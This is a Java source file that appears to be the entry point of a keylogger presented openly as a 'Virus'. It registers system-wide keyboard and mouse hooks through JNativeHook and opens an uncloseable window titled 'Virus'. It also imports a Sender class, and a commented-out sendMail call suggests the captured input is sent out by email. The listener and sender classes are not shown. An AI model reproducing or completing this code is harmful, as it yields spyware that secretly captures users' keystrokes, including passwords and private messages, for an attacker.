package main;

import java.net.InetAddress;
import java.net.UnknownHostException;

import javax.swing.JFrame;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import handlers.AdditionalFunctionsIDOntBotherToCreateTheirOwnClasses;
import handlers.ManageService;
import handlers.Sender;

public class Main {

	
	public static void main(String[] args) throws UnknownHostException {
		
	
		ManageService service = new ManageService();
		
	
			try {
				// Sender.sendMail("Wassup?");
				
	
				GlobalScreen.registerNativeHook();
			} catch (NativeHookException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
	
		
		GlobalScreen.getInstance().addNativeKeyListener(service.getkeyboard());
		GlobalScreen.getInstance().addNativeMouseListener(service.getMouse());
		
		JFrame jf1 = new JFrame();
		jf1.setSize(720, 480);
		jf1.setTitle("Virus");
		jf1.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
		jf1.setLayout(null);
		jf1.setResizable(false);
		jf1.setLocationRelativeTo(null);
		jf1.requestFocus();
		
		jf1.setVisible(true);
		
	}

}
